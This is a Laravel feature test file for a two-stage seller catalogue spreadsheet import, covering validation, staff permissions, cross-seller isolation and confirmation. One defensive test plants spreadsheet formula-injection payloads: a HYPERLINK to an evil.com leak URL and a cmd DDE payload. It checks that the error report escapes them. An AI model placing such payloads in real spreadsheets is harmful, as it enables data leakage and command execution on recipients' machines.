<?php

namespace Tests\Feature;

use App\Models\Attribute;
use App\Models\AttributeOption;
use App\Models\Brand;
use App\Models\Category;
use App\Models\Company;
use App\Models\Product;
use App\Models\ProductAttributeValue;
use App\Models\ProductVariant;
use App\Models\SellerCatalogueImport;
use App\Models\SellerListing;
use App\Models\SellerPermission;
use App\Models\SellerRole;
use App\Models\SellerStaff;
use App\Models\SellerStaffPermission;
use App\Models\SubCatgory;
use App\Models\User;
use Database\Seeders\SellerRolesAndPermissionsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\File;
use Laravel\Sanctum\Sanctum;
use Tests\TestCase;

class Phase2_3_SellerCatalogueImportTest extends TestCase
{
    use RefreshDatabase;

    protected User $sellerA;
    protected Company $companyA;
    protected User $sellerB;
    protected Company $companyB;

    protected Category $category;
    protected SubCatgory $subcategory;
    protected Brand $brand;
    protected Attribute $attribute;
    protected AttributeOption $attributeOption;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(SellerRolesAndPermissionsSeeder::class);

        // Seller A (Owner)
        $this->sellerA  = User::factory()->create(['email' => 'seller_a@test.com', 'name' => 'Seller A Owner']);
        $this->companyA = Company::factory()->create([
            'user_id' => $this->sellerA->id,
            'name'    => 'Alpha Industrial Coatings',
        ]);

        // Seller B (Owner)
        $this->sellerB  = User::factory()->create(['email' => 'seller_b@test.com', 'name' => 'Beta Chemical Works']);
        $this->companyB = Company::factory()->create([
            'user_id' => $this->sellerB->id,
            'name'    => 'Beta Chemical Works',
        ]);

        // Shared Catalogue Taxonomy
        $this->category = Category::create([
            'name'   => 'Paints & Coatings',
            'status' => 'Active',
        ]);

        $this->subcategory = SubCatgory::create([
            'cid'         => $this->category->id,
            'category_id' => $this->category->id,
            'name'        => 'Industrial Enamels',
            'status'      => 'Active',
        ]);

        $this->brand = Brand::create([
            'category_id' => $this->category->id,
            'name'        => 'Asian Paints Pro',
            'status'      => 'Active',
        ]);

        // Master Dynamic Attribute: Finish Type (High Gloss Mirror, Matte Finish)
        $this->attribute = Attribute::create([
            'name'      => 'Finish Type',
            'code'      => 'finish_type',
            'type'      => 'single_select',
            'status'    => 'Active',
        ]);

        $this->attributeOption = AttributeOption::create([
            'attribute_id' => $this->attribute->id,
            'label'        => 'High Gloss Mirror',
            'value'        => 'high_gloss',
        ]);
    }

    /**
     * Helper to create a valid CSV file stream.
     */
    protected function createCsvUpload(array $rows, string $filename = 'test_catalogue.csv'): UploadedFile
    {
        $headers = [
            'action',
            'product_id',
            'product_name',
            'product_title',
            'category_name',
            'subcategory_name',
            'brand_name',
            'hsn_code',
            'tax_percent',
            'product_status',
            'variant_sku',
            'variant_name',
            'shade_or_color',
            'color_hex',
            'size_or_packing',
            'variant_status',
            'dynamic_attributes',
            'seller_sku',
            'barcode',
            'unit_of_measurement',
            'case_pack_quantity',
            'min_order_quantity',
            'order_multiple',
            'allow_unit_orders',
            'allow_carton_orders',
            'seller_price',
            'commission_rate',
            'selling_price',
            'customer_mrp',
            'stock_quantity',
            'low_stock_threshold',
            'dispatch_lead_days',
            'listing_status',
        ];

        $content = "\xEF\xBB\xBF"; // UTF-8 BOM
        $temp = fopen('php://memory', 'r+');
        fputcsv($temp, $headers);
        foreach ($rows as $row) {
            fputcsv($temp, $row);
        }
        rewind($temp);
        $content .= stream_get_contents($temp);
        fclose($temp);

        return UploadedFile::fake()->createWithContent($filename, $content);
    }

    /**
     * Helper to generate a default valid row data array.
     */
    protected function defaultValidRow(array $overrides = []): array
    {
        $defaults = [
            'CREATE',                                // action
            '',                                      // product_id
            'Apcolite High Gloss Polyurethane Paint', // product_name
            'Premium Industrial Polyurethane',       // product_title
            'Paints & Coatings',                     // category_name
            'Industrial Enamels',                    // subcategory_name
            'Asian Paints Pro',                      // brand_name
            '3208',                                  // hsn_code
            '18',                                    // tax_percent
            'Active',                                // product_status
            'VAR-APC-GLOSS-1L',                      // variant_sku
            'Gloss White - 1 Litre',                 // variant_name
            'White',                                 // shade_or_color
            '#FFFFFF',                               // color_hex
            '1 Litre',                               // size_or_packing
            'Active',                                // variant_status
            'Finish Type: High Gloss Mirror',        // dynamic_attributes
            'ALPH-PU-GLOSS-001',                     // seller_sku
            '8901234567890',                         // barcode
            'Litre',                                 // unit_of_measurement
            '6',                                     // case_pack_quantity
            '2',                                     // min_order_quantity
            '1',                                     // order_multiple
            'Yes',                                   // allow_unit_orders
            'Yes',                                   // allow_carton_orders
            '350.00',                                // seller_price
            '10.00',                                 // commission_rate
            '385.00',                                // selling_price
            '450.00',                                // customer_mrp
            '100',                                   // stock_quantity
            '15',                                    // low_stock_threshold
            '2',                                     // dispatch_lead_days
            'Active',                                // listing_status
        ];

        foreach ($overrides as $index => $val) {
            $defaults[$index] = $val;
        }

        return $defaults;
    }

    // ==========================================
    // 1. TEMPLATE GENERATION & DOWNLOAD
    // ==========================================

    /** @test */
    public function seller_can_download_standard_excel_import_template_via_api()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $response = $this->withToken($token)->get('/api/v2/seller/catalogue/import/template?format=xlsx');

        $response->assertOk();
        $this->assertEquals(
            'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            $response->headers->get('Content-Type')
        );
        $this->assertStringContainsString('apnifactory_catalogue_import_template.xlsx', $response->headers->get('content-disposition'));
    }

    /** @test */
    public function seller_can_download_standard_csv_import_template_via_api()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $response = $this->withToken($token)->get('/api/v2/seller/catalogue/import/template?format=csv');

        $response->assertOk();
        $this->assertStringContainsString('text/csv', $response->headers->get('Content-Type'));
        $content = file_get_contents($response->getFile()->getPathname());

        $this->assertStringStartsWith("\xEF\xBB\xBF", $content);
        $this->assertStringContainsString('seller_sku', $content);
        $this->assertStringContainsString('product_name', $content);
        $this->assertStringContainsString('category_name', $content);
    }

    /** @test */
    public function seller_can_download_template_via_web_route()
    {
        $response = $this->actingAs($this->sellerA)->get(route('seller.catalogue.import.template', ['format' => 'xlsx']));

        $response->assertOk();
        $this->assertStringContainsString('apnifactory_catalogue_import_template.xlsx', $response->headers->get('content-disposition'));
    }

    // ==========================================
    // 2. STAGE 1: UPLOAD & VALIDATION (NO MUTATIONS)
    // ==========================================

    /** @test */
    public function stage1_upload_and_validate_does_not_mutate_catalogue_database()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $row = $this->defaultValidRow();
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertOk()
            ->assertJsonPath('status', true)
            ->assertJsonPath('data.status', 'validated')
            ->assertJsonPath('data.total_rows', 1)
            ->assertJsonPath('data.valid_rows', 1)
            ->assertJsonPath('data.invalid_rows', 0)
            ->assertJsonPath('data.can_confirm', true);

        $importId = $response->json('data.import_id');

        // Verify import record exists in database
        $this->assertDatabaseHas('seller_catalogue_imports', [
            'id'         => $importId,
            'company_id' => $this->companyA->id,
            'status'     => 'validated',
            'valid_rows' => 1,
        ]);

        // CRITICAL: Catalogue database MUST NOT be mutated in Stage 1!
        $this->assertDatabaseMissing('products', [
            'name' => 'Apcolite High Gloss Polyurethane Paint',
        ]);
        $this->assertDatabaseMissing('seller_listings', [
            'seller_sku' => 'ALPH-PU-GLOSS-001',
        ]);
    }

    /** @test */
    public function stage1_detects_duplicate_seller_sku_within_uploaded_spreadsheet()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $row1 = $this->defaultValidRow();
        $row2 = $this->defaultValidRow([2 => 'Apcolite High Gloss Variant 2']); // Same SKU 'ALPH-PU-GLOSS-001'

        $file = $this->createCsvUpload([$row1, $row2]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(200) // 1 valid, 1 invalid -> validated status with partial invalid rows
            ->assertJsonPath('data.total_rows', 2)
            ->assertJsonPath('data.valid_rows', 1)
            ->assertJsonPath('data.invalid_rows', 1);

        $import = SellerCatalogueImport::find($response->json('data.import_id'));
        $this->assertNotNull($import->error_report_path);
        $this->assertFileExists(storage_path('app/' . $import->error_report_path));
    }

    /** @test */
    public function stage1_detects_invalid_category_and_subcategory()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        // Row with non-existent category
        $row = $this->defaultValidRow([
            4 => 'Non Existent Category',
            5 => 'Industrial Enamels',
        ]);
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(422) // 0 valid rows -> validation_failed
            ->assertJsonPath('data.status', 'validation_failed')
            ->assertJsonPath('data.valid_rows', 0)
            ->assertJsonPath('data.invalid_rows', 1)
            ->assertJsonPath('data.can_confirm', false);
    }

    /** @test */
    public function stage1_detects_unregistered_brand()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $row = $this->defaultValidRow([
            6 => 'Unregistered Ghost Brand',
        ]);
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(422)
            ->assertJsonPath('data.valid_rows', 0)
            ->assertJsonPath('data.invalid_rows', 1);
    }

    /** @test */
    public function stage1_detects_invalid_dynamic_attribute_option()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        // Finish Type only allows "High Gloss Mirror" in setUp
        $row = $this->defaultValidRow([
            16 => 'Finish Type: Non Existent Finish Color Option',
        ]);
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(422)
            ->assertJsonPath('data.invalid_rows', 1);
    }

    /** @test */
    public function stage1_detects_invalid_pricing_mrp_lower_than_seller_price()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $row = $this->defaultValidRow([
            25 => '500.00', // seller_price = 500
            28 => '400.00', // customer_mrp = 400 (lower than seller price -> invalid)
        ]);
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(422)
            ->assertJsonPath('data.invalid_rows', 1);
    }

    // ==========================================
    // 3. PERMISSION ENFORCEMENT ON IMPORT
    // ==========================================

    /** @test */
    public function staff_without_pricing_permission_cannot_specify_prices()
    {
        // Create staff user with role product_manager, but explicitly deny pricing.update
        $staffUser = User::factory()->create(['email' => 'staff_no_pricing@test.com']);
        $role = SellerRole::where('name', 'product_manager')->first();

        $staff = SellerStaff::create([
            'company_id'     => $this->companyA->id,
            'user_id'        => $staffUser->id,
            'seller_role_id' => $role->id,
            'is_active'      => true,
            'activated_at'   => now(),
        ]);

        // Explicitly deny pricing.update
        $pricingPerm = SellerPermission::where('name', 'pricing.update')->first();
        SellerStaffPermission::create([
            'seller_staff_id'      => $staff->id,
            'seller_permission_id' => $pricingPerm->id,
            'granted'              => false,
        ]);

        $token = $staffUser->createToken('test')->plainTextToken;

        $row = $this->defaultValidRow([
            25 => '350.00', // seller price included
        ]);
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(422)
            ->assertJsonPath('data.invalid_rows', 1);
    }

    /** @test */
    public function staff_without_inventory_permission_cannot_update_stock_quantity()
    {
        // Staff user with explicitly denied inventory.update
        $staffUser = User::factory()->create(['email' => 'staff_no_inventory@test.com']);
        $role = SellerRole::where('name', 'product_manager')->first();

        $staff = SellerStaff::create([
            'company_id'     => $this->companyA->id,
            'user_id'        => $staffUser->id,
            'seller_role_id' => $role->id,
            'is_active'      => true,
            'activated_at'   => now(),
        ]);

        $invPerm = SellerPermission::where('name', 'inventory.update')->first();
        SellerStaffPermission::create([
            'seller_staff_id'      => $staff->id,
            'seller_permission_id' => $invPerm->id,
            'granted'              => false,
        ]);

        $token = $staffUser->createToken('test')->plainTextToken;

        $row = $this->defaultValidRow([
            29 => '500', // stock_quantity included
        ]);
        $file = $this->createCsvUpload([$row]);

        $response = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);

        $response->assertStatus(422)
            ->assertJsonPath('data.invalid_rows', 1);
    }

    /** @test */
    public function staff_without_excel_commit_cannot_confirm_stage2()
    {
        // 1. Upload valid file with Owner
        $tokenOwner = $this->sellerA->createToken('test')->plainTextToken;
        $row = $this->defaultValidRow();
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->withToken($tokenOwner)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);
        $importId = $uploadRes->json('data.import_id');

        // 2. Staff user without excel.commit tries to confirm
        $staffUser = User::factory()->create(['email' => 'staff_no_commit@test.com']);
        $role = SellerRole::where('name', 'readonly_staff')->first();

        SellerStaff::create([
            'company_id'     => $this->companyA->id,
            'user_id'        => $staffUser->id,
            'seller_role_id' => $role->id,
            'is_active'      => true,
            'activated_at'   => now(),
        ]);

        app('auth')->forgetGuards();
        Sanctum::actingAs($staffUser);

        $response = $this->postJson("/api/v2/seller/catalogue/import/{$importId}/confirm");

        $response->assertStatus(403);
    }

    // ==========================================
    // 4. CROSS-SELLER ISOLATION & IDOR DEFENSE
    // ==========================================

    /** @test */
    public function seller_b_cannot_confirm_seller_a_import()
    {
        $tokenA = $this->sellerA->createToken('test')->plainTextToken;
        $row = $this->defaultValidRow();
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->withToken($tokenA)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);
        $importId = $uploadRes->json('data.import_id');

        // Seller B attempts to confirm Seller A's import
        app('auth')->forgetGuards();
        Sanctum::actingAs($this->sellerB);

        $response = $this->postJson("/api/v2/seller/catalogue/import/{$importId}/confirm");

        $response->assertStatus(404);
    }

    /** @test */
    public function seller_b_cannot_inspect_seller_a_import_status()
    {
        $tokenA = $this->sellerA->createToken('test')->plainTextToken;
        $row = $this->defaultValidRow();
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->withToken($tokenA)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);
        $importId = $uploadRes->json('data.import_id');

        app('auth')->forgetGuards();
        Sanctum::actingAs($this->sellerB);

        $response = $this->getJson("/api/v2/seller/catalogue/import/{$importId}");

        $response->assertStatus(404);
    }

    /** @test */
    public function seller_b_cannot_download_seller_a_error_report()
    {
        $tokenA = $this->sellerA->createToken('test')->plainTextToken;
        // Upload file with errors
        $row = $this->defaultValidRow([4 => 'Invalid Category']);
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->withToken($tokenA)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);
        $importId = $uploadRes->json('data.import_id');

        // Seller B tries to download Seller A's error report
        app('auth')->forgetGuards();
        Sanctum::actingAs($this->sellerB);

        $response = $this->get("/api/v2/seller/catalogue/imports/{$importId}/errors");

        $response->assertStatus(404);
    }

    // ==========================================
    // 5. STAGE 2: CONFIRMATION & EXECUTION
    // ==========================================

    /** @test */
    public function stage2_confirm_creates_product_variant_listing_and_dynamic_attributes()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        $row = $this->defaultValidRow([
            17 => 'ALPH-PU-GLOSS-999', // seller_sku
        ]);
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);
        $importId = $uploadRes->json('data.import_id');

        // Stage 2: Confirm & Execute
        $confirmRes = $this->withToken($token)->postJson("/api/v2/seller/catalogue/import/{$importId}/confirm");

        $confirmRes->assertOk()
            ->assertJsonPath('status', true)
            ->assertJsonPath('data.status', 'completed')
            ->assertJsonPath('data.created_products', 1)
            ->assertJsonPath('data.created_variants', 1)
            ->assertJsonPath('data.created_listings', 1)
            ->assertJsonPath('data.failed_rows', 0);

        // Verify Product created
        $product = Product::where('name', 'Apcolite High Gloss Polyurethane Paint')->first();
        $this->assertNotNull($product);
        $this->assertEquals($this->category->id, $product->category_id);
        $this->assertEquals($this->brand->id, $product->brand_id);

        // Verify Dynamic Attribute Value created
        $this->assertDatabaseHas('product_attribute_values', [
            'product_id'          => $product->id,
            'attribute_id'        => $this->attribute->id,
            'attribute_option_id' => $this->attributeOption->id,
        ]);

        // Verify Product Variant created
        $variant = ProductVariant::where('product_id', $product->id)->first();
        $this->assertNotNull($variant);
        $this->assertEquals('VAR-APC-GLOSS-1L', $variant->variant_sku);

        // Verify Seller Listing created
        $listing = SellerListing::where('company_id', $this->companyA->id)
            ->where('seller_sku', 'ALPH-PU-GLOSS-999')
            ->first();

        $this->assertNotNull($listing);
        $this->assertEquals($this->companyA->id, $listing->company_id);
        $this->assertEquals($this->sellerA->id, $listing->seller_user_id);
        $this->assertEquals(350.00, (float)$listing->seller_price);
        $this->assertEquals(450.00, (float)$listing->mrp);
        $this->assertEquals(100, $listing->stock_quantity);
    }

    /** @test */
    public function stage2_updating_existing_sku_modifies_record_without_creating_duplicates()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        // 1. First import creates the listing
        $row1 = $this->defaultValidRow([
            17 => 'ALPH-EXISTING-SKU-1',
            25 => '300.00',
            29 => '20', // initial stock: 20
        ]);
        $file1 = $this->createCsvUpload([$row1]);
        $up1 = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', ['file' => $file1]);
        $this->withToken($token)->postJson("/api/v2/seller/catalogue/import/{$up1->json('data.import_id')}/confirm");

        $this->assertEquals(1, SellerListing::where('seller_sku', 'ALPH-EXISTING-SKU-1')->count());
        $initialListing = SellerListing::where('seller_sku', 'ALPH-EXISTING-SKU-1')->first();
        $this->assertEquals(20, $initialListing->stock_quantity);

        // 2. Second import updates the existing listing price & stock
        $row2 = $this->defaultValidRow([
            0  => 'UPDATE',
            17 => 'ALPH-EXISTING-SKU-1',
            25 => '325.00', // updated seller price
            29 => '85',     // updated stock: 85
        ]);
        $file2 = $this->createCsvUpload([$row2]);
        $up2 = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', ['file' => $file2]);

        $this->assertEquals('UPDATE', $up2->json('data.summary.updates') > 0 ? 'UPDATE' : 'CREATE');

        $this->withToken($token)->postJson("/api/v2/seller/catalogue/import/{$up2->json('data.import_id')}/confirm");

        // Verify still exactly 1 listing, but updated
        $this->assertEquals(1, SellerListing::where('seller_sku', 'ALPH-EXISTING-SKU-1')->count());
        $updatedListing = SellerListing::where('seller_sku', 'ALPH-EXISTING-SKU-1')->first();
        $this->assertEquals(85, $updatedListing->stock_quantity);
        $this->assertEquals(325.00, (float)$updatedListing->seller_price);
    }

    // ==========================================
    // 6. ERROR REPORT & FORMULA INJECTION DEFENSE
    // ==========================================

    /** @test */
    public function error_report_sanitizes_cells_against_formula_injection()
    {
        $token = $this->sellerA->createToken('test')->plainTextToken;

        // Row with formula injection payloads in invalid fields
        $row = $this->defaultValidRow([
            4 => '=HYPERLINK("http://evil.com/leak")', // Formula in category
            6 => '+cmd|"/C calc"!A0',                 // Formula in brand
        ]);
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->withToken($token)->postJson('/api/v2/seller/catalogue/import/validate', [
            'file' => $file,
        ]);
        $importId = $uploadRes->json('data.import_id');

        $import = SellerCatalogueImport::find($importId);
        $this->assertNotNull($import->error_report_path);

        $errorContent = file_get_contents(storage_path('app/' . $import->error_report_path));

        // Must prefix with single quote to prevent execution in Excel
        $this->assertStringContainsString("'=HYPERLINK", $errorContent);
        $this->assertStringContainsString("'+cmd", $errorContent);
    }

    // ==========================================
    // 7. WEB INTERFACE CONTROLLER & VIEWS
    // ==========================================

    /** @test */
    public function seller_can_navigate_all_web_import_routes()
    {
        $this->withoutMiddleware(\App\Http\Middleware\VerifyCsrfToken::class);

        // 1. Import Index Page
        $indexRes = $this->actingAs($this->sellerA)->get(route('seller.catalogue.import'));
        $indexRes->assertOk()
            ->assertViewIs('seller.catalogue.import')
            ->assertSee('Stage 1: Upload Catalogue Spreadsheet')
            ->assertSee('Download Excel Template');

        // 2. Validate Upload via Web Form
        $row = $this->defaultValidRow([17 => 'WEB-SKU-100']);
        $file = $this->createCsvUpload([$row]);

        $uploadRes = $this->actingAs($this->sellerA)->post(route('seller.catalogue.import.validate'), [
            'file' => $file,
        ]);

        $latestImport = SellerCatalogueImport::latest('id')->first();
        $this->assertNotNull($latestImport);
        $uploadRes->assertRedirect(route('seller.catalogue.import.preview', $latestImport->id));

        // 3. Import Preview Page
        $previewRes = $this->actingAs($this->sellerA)->get(route('seller.catalogue.import.preview', $latestImport->id));
        $previewRes->assertOk()
            ->assertViewIs('seller.catalogue.import-preview')
            ->assertSee('WEB-SKU-100')
            ->assertSee('Stage 2: Confirmation');

        // 4. Confirm Import via Web Form
        $confirmRes = $this->actingAs($this->sellerA)->post(route('seller.catalogue.import.confirm', $latestImport->id));
        $confirmRes->assertRedirect(route('seller.catalogue.import.history'));

        // 5. Import History Page
        $historyRes = $this->actingAs($this->sellerA)->get(route('seller.catalogue.import.history'));
        $historyRes->assertOk()
            ->assertViewIs('seller.catalogue.import-history')
            ->assertSee('Batch Catalogue Import History')
            ->assertSee('Completed');
    }
}
